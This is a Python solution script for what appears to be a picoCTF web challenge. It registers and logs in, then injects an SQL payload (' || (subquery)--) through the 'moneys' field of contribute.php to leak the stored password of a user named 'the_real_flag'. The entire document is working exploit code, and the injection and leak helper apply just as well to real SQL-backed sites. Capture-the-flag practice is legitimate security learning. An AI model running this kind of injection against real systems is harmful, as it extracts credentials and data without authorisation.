import requests
import re

url = "http://wily-courier.picoctf.net:57265/"
s = requests.Session()

# register and login
creds = {
    'user': 'test',
    'pass': 'test'
}

res = s.post(f'{url}/register.php', data=creds)
print("> Registered")

res = s.post(f'{url}/index.php', data=creds)
print("> Logged in")

# sqli
def leak(payload):
    res = s.post(f'{url}/contribute.php', data={
        "moneys": f"' || ({payload})--"
    })

    try:
        resp = re.findall(r'contribution: \$(.+)</h6>', res.text)[0]
        return resp
    except:
        return res.text

resp = leak("select wordpass from startup_users where nameuser='the_real_flag'")
print("Flag:", resp)